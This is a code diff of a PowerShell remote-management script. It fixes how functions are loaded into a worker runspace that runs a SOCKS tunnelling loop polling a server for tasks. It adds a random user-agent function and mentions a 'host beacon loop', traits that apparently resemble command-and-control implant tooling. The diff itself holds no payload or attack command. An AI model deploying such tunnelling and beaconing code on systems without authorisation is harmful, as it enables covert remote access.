@@ -827,12 +827,14 @@ function Invoke-RmmSocksCycle {
 }
 
 function Get-RmmSocksWorkerFunctionNames {
+    # Dependency order: callees before callers; all must be re-defined inside the worker runspace.
     @(
-        'Write-RmmLog',
+        'Get-RandomUserAgent',
         'Get-RmmHttpStatusHint',
         'Get-RmmHttpErrorBody',
         'Convert-RmmHttpResponseContent',
         'Resolve-RmmTunnelIpv4',
+        'Write-RmmLog',
         'Invoke-RmmRestMethod',
         'Get-RmmRequestHeaders',
         'Get-RmmSocksPollActive',
@@ -849,10 +851,8 @@ function Import-RmmFunctionsIntoRunspace {
     )
     foreach ($name in $FunctionNames) {
         $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
-        $null = $PowerShellInstance.AddScript({
-            param($FunctionName, $FunctionBody)
-            Set-Item -Path "function:$FunctionName" -Value $FunctionBody -Force
-        }, $false).AddArgument($name).AddArgument($cmd.ScriptBlock).Invoke()
+        $def = $cmd.ScriptBlock.ToString()
+        $null = $PowerShellInstance.AddScript("function global:$name { $def }", $false).Invoke()
         if ($PowerShellInstance.Streams.Error.Count -gt 0) {
             $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
             $PowerShellInstance.Streams.Error.Clear()
@@ -861,7 +861,11 @@ function Import-RmmFunctionsIntoRunspace {
         $PowerShellInstance.Commands.Clear()
     }
     $null = $PowerShellInstance.AddScript(
-        'if (-not (Get-Command Invoke-RmmRestMethod -CommandType Function -ErrorAction SilentlyContinue)) { throw ''SOCKS bootstrap: Invoke-RmmRestMethod missing'' }',
+        @'
+if (-not (Get-Command Invoke-RmmRestMethod -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Invoke-RmmRestMethod missing' }
+if (-not (Get-Command Get-RmmSocksTasksFromPoll -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Get-RmmSocksTasksFromPoll missing' }
+if (-not (Get-Command New-Object -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: New-Object missing (session state)' }
+'@,
         $false
     ).Invoke()
     if ($PowerShellInstance.Streams.Error.Count -gt 0) {
@@ -906,7 +910,8 @@ function Install-RmmSocksRunspaceHostLog {
 
 function New-RmmSocksRunspace {
     $fnNames = Get-RmmSocksWorkerFunctionNames
-    $rs = [runspacefactory]::CreateRunspace()
+    $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+    $rs = [runspacefactory]::CreateRunspace($iss)
     # UseNewThread: ReuseThread can leave this runspace as the thread DefaultRunspace and break the host beacon loop.
     $rs.ThreadOptions = 'UseNewThread'
     $rs.Open()
